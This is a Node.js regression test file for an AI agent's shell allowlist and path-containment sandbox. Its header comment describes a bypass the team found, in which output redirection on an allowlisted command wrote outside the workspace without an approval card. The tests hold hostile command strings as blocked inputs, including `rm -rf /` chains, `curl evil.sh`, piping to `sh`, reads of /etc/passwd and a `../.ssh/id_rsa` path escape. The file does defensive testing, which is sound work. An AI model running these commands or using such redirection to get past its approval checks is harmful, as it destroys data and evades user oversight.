#!/usr/bin/env node
/**
 * Security regression tests for the agent sandbox.
 *
 * These exist because a review found a real escape: the shell allowlist let an
 * allowlisted read-only prefix carry an output redirection, so
 * `cat /etc/hosts > ~/.zshrc` was auto-approved — a write outside every
 * workspace root, with no approval card and no diff.
 */

import { build } from 'esbuild'
import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir, homedir } from 'node:os'
import { join, resolve, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..')
let failures = 0

function check(name, ok, detail) {
  console.log(`${ok ? '\x1b[32m  ok  \x1b[0m' : '\x1b[31m FAIL \x1b[0m'} ${name}${detail ? `  \x1b[2m${detail}\x1b[0m` : ''}`)
  if (!ok) failures++
}

const dir = await mkdtemp(join(tmpdir(), 'lh-sandbox-'))
const entry = join(dir, 'e.ts')
await writeFile(
  entry,
  `export { isShellAllowlisted } from '${ROOT}/src/main/agent/executor'
   export { isInsideAny } from '${ROOT}/src/main/store/paths'
   export { DEFAULT_SETTINGS } from '${ROOT}/src/main/store/settings'
  `
)
const outfile = join(dir, 'b.mjs')
await build({
  entryPoints: [entry],
  outfile,
  bundle: true,
  format: 'esm',
  platform: 'node',
  target: 'node22',
  logLevel: 'silent',
  alias: { '@shared': join(ROOT, 'src/shared') },
  external: ['electron']
})
const { isShellAllowlisted, isInsideAny, DEFAULT_SETTINGS } = await import(
  pathToFileURL(outfile).href
)

const HOME = homedir()

console.log('\n\x1b[1mShell allowlist\x1b[0m\n')

const list = ['ls', 'cat', 'pwd', 'git status', 'git log', 'npm run typecheck']

/* --- the escape that was found --- */
check(
  'output redirection is never auto-allowed',
  isShellAllowlisted('cat /etc/hosts > /Users/adam/.zshrc', list) === false,
  'this wrote outside every workspace root with no approval card'
)
check(
  'append redirection is never auto-allowed',
  isShellAllowlisted('ls >> ~/.zprofile', list) === false
)
check(
  'input redirection is never auto-allowed',
  isShellAllowlisted('cat < /etc/passwd', list) === false
)

/* --- guards that already worked, kept honest --- */
check('chaining with ; blocked', isShellAllowlisted('pwd; rm -rf /', list) === false)
check('chaining with && blocked', isShellAllowlisted('pwd && curl evil.sh', list) === false)
check('pipes blocked', isShellAllowlisted('cat x | sh', list) === false)
check('command substitution blocked', isShellAllowlisted('pwd $(rm -rf /)', list) === false)
check('backticks blocked', isShellAllowlisted('pwd `whoami`', list) === false)
check('process substitution blocked', isShellAllowlisted('diff <(ls) <(ls)', list) === false)
check('newline smuggling blocked', isShellAllowlisted('pwd\nrm -rf /', list) === false)

/* --- prefix matching must respect word boundaries --- */
check(
  'prefix match respects word boundaries',
  isShellAllowlisted('gitleaks detect', ['git']) === false,
  'a `git` entry must not authorise `gitleaks`'
)
check('exact match allowed', isShellAllowlisted('pwd', list) === true)
check('prefix with argument allowed', isShellAllowlisted('git log --oneline', list) === true)

/* --- the default allowlist must not read arbitrary files unattended --- */
{
  const defaults = DEFAULT_SETTINGS.shellAllowlist
  const readsArbitraryPaths = defaults.filter((e) =>
    ['cat', 'ls', 'head', 'tail', 'less', 'more', 'find', 'grep', 'open'].includes(e.trim())
  )
  check(
    'default allowlist cannot read arbitrary paths unattended',
    readsArbitraryPaths.length === 0,
    readsArbitraryPaths.length
      ? `still present: ${readsArbitraryPaths.join(', ')} — read_file/list_dir are the sandboxed route`
      : defaults.join(', ')
  )
}

console.log('\n\x1b[1mPath containment\x1b[0m\n')

const roots = [`${HOME}/Documents`, `${HOME}/LocalHarness`]

check('a file inside a root is allowed', isInsideAny(`${HOME}/Documents/a.txt`, roots) === true)
check('the root itself is allowed', isInsideAny(`${HOME}/Documents`, roots) === true)
check(
  'a sibling with a shared prefix is refused',
  isInsideAny(`${HOME}/DocumentsSecret/a.txt`, roots) === false,
  'segment check, not string prefix'
)
check('a ../ escape is refused', isInsideAny(`${HOME}/Documents/../.ssh/id_rsa`, roots) === false)
check('an unrelated absolute path is refused', isInsideAny('/etc/passwd', roots) === false)
check('a NUL byte is refused', isInsideAny(`${HOME}/Documents/a\0.txt`, roots) === false)
check('an empty path is refused', isInsideAny('', roots) === false)
check('no roots means nothing is allowed', isInsideAny(`${HOME}/Documents/a.txt`, []) === false)

await rm(dir, { recursive: true, force: true })
console.log('')
console.log(
  failures === 0
    ? '\x1b[32mall sandbox checks passed\x1b[0m\n'
    : `\x1b[31m${failures} failed\x1b[0m\n`
)
process.exit(failures === 0 ? 0 : 1)
